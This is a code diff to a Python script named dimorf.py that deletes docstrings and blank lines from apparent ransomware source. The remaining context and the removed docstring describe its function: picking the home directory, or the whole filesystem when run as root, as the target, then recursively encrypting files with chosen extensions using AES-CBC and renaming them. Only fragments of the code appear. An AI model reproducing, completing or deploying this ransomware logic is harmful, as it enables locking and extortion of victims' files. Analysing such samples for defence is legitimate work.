@@ -1,7 +1,6 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
-
 import sys
 import os
 import logging
@@ -19,20 +18,6 @@ __module__ = 'dimorf.py'
 
 
 def __save_log_error(dir_log: str, logs: list) -> str:
-    """ Logs error messages to a file and returns the path of the log file.
-
-    Args:
-        dir_log (str): The directory where the log file should be saved.
-        logs (list): A list of error messages to be logged.
-
-    Returns:
-        str: The path of the log file.
-
-    Raises:
-        OSError: If there's an error creating the log directory.
-        Exception: If there's an error during the logging process.
-        
-    """
     try:
         if (
             not (
@@ -66,25 +51,9 @@ def __save_log_error(dir_log: str, logs: list) -> str:
 
 
 def check_os(osname: str) -> bool:
-    """ Check if the specified operating system is supported.
-    
-    Args:
-        osname -- the name of the operating system (string)
-    
-    Returns:
-        True if the operating system is supported, False otherwise (boolean)
-        
-    Raises:
-        This function may raise a SystemExit exception if the Python version is not supported.
-        
-    """
-
     PATH = os.getenv('HOME')
-    
     if (os.getuid() == 0):
         PATH = '/'
-    
-    
     # # check if os is linux.
     is_linux = [
         prop for prop in os.uname() if ((prop == "Linux")) and (
@@ -142,23 +111,6 @@ def find_and_encrypt(
     block_bytes: int,
     prev_dirname: str = None
 ) -> None:
-    """ Recursively searches for files with the specified extensions in the specified path and its subdirectories,
-    encrypts them using the AES-CBC algorithm with the specified key and saves them with a new extension.
-    Files with the specified names to be hidden are skipped.
-    
-    Args:
-        path (str): The directory path to start the search from.
-        ext_files (list): A list of file extensions to be encrypted.
-        cd (list): A list of directory names to exclude from the search.
-        hidden (str): A string containing the name of files to be hidden.
-        new_ext (str): A string with the new extension to be added to the encrypted files.
-        key (bytes): The encryption key as bytes.
-        block_bytes (int): 
-            The size of the block in bytes that the file will be read in, 
-            and also the size of the encryption block.
-            
-    """
-
     # # go in search of the file.
     for root, dirs, files in os.walk(path):
         if (
